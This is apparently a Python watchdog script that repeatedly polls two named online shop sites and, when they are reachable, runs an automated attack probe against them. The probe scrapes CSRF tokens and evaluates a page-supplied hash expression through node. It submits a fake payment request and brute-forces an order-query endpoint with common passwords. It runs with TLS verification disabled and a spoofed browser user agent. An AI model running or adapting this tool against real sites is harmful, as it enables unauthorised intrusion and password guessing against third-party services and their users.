#!/usr/bin/env python3
"""Poll jinku.lol / hm0880 until reachable, then run rainbow deep probe."""
import json
import re
import subprocess
import time

import requests

requests.packages.urllib3.disable_warnings()

TARGETS = [
    ("jinku.lol", "https://jinku.lol/shop/"),
    ("hm0880.top", "https://hm0880.top/shop/"),
]
OUT_DIR = "/data/automation/results"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
CSRF_RE = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT_RE = re.compile(r"var hashsalt=(.+?);")
SHOWORDER_RE = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"])")


def compute_hashsalt(expr):
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr.strip()})"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


def rainbow_deep(base):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": base})
    report = {"base": base, "ts": time.strftime("%Y-%m-%d %H:%M:%S")}
    r = s.get(base, timeout=25)
    report["home_len"] = len(r.text)
    if len(r.text) < 500:
        return report
    gc = s.get(base + "ajax.php?act=getcount", timeout=12)
    report["getcount"] = gc.text[:300]
    tl = s.get(base + "toollogs.php", timeout=12)
    report["toollogs_status"] = tl.status_code
    report["toollogs_snip"] = tl.text[:200]
    csrf = CSRF_RE.search(r.text)
    if csrf:
        report["csrf"] = csrf.group(1)
    # try first buy tid from home
    tid_m = re.search(r'mod=buy[^"]*tid=(\d+)', r.text)
    if tid_m:
        tid = tid_m.group(1)
        buy = s.get(base, params={"mod": "buy", "tid": tid}, timeout=20)
        csrf2 = CSRF_RE.search(buy.text)
        hs_m = HASHSALT_RE.search(buy.text)
        if csrf2 and hs_m:
            hs = compute_hashsalt(hs_m.group(1))
            pay = s.post(
                base + "ajax.php?act=pay",
                data={
                    "tid": tid,
                    "inputvalue": "123456789",
                    "num": "1",
                    "hashsalt": hs,
                    "csrf_token": csrf2.group(1),
                },
                timeout=15,
            )
            report["pay_resp"] = pay.text[:300]
    # query pwd quick
    for pwd in ["123456", "888888", "666666", "000000", "password"]:
        qr = s.post(
            base + "ajax.php?act=query",
            data={"type": "1", "content": "1", "pwd": pwd},
            timeout=12,
        )
        if SHOWORDER_RE.search(qr.text) or "kminfo" in qr.text:
            report["pwd_hit"] = pwd
            report["query_resp"] = qr.text[:300]
            break
    return report


def poll_once():
    hits = []
    for name, url in TARGETS:
        try:
            r = requests.get(url, timeout=12, verify=False, headers={"User-Agent": UA})
            if r.status_code == 200 and len(r.text) > 3000:
                hits.append((name, url))
        except Exception:
            pass
    return hits


def main():
    while True:
        hits = poll_once()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        log = {"ts": stamp, "hits": [h[0] for h in hits]}
        print(json.dumps(log))
        for name, url in hits:
            rep = rainbow_deep(url)
            out = f"{OUT_DIR}/{name}/watchdog_{stamp}.json"
            import os

            os.makedirs(os.path.dirname(out), exist_ok=True)
            with open(out, "w") as f:
                json.dump(rep, f, ensure_ascii=False, indent=2)
            print("saved", out)
        time.sleep(300)


if __name__ == "__main__":
    main()
